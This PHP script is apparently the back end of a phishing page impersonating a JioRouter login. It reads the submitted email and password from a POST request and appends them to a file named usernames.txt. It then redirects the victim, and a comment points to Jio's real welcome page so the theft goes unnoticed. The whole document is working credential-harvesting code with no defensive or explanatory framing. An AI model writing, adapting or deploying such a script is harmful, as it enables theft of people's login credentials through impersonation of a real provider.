<?php
file_put_contents("usernames.txt", "JioRouter Username: " . $email = $_POST['email'] ."\nPassword: ". $pass = $_POST['pass'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.jio.com/welcome
header("Location: $url");
?>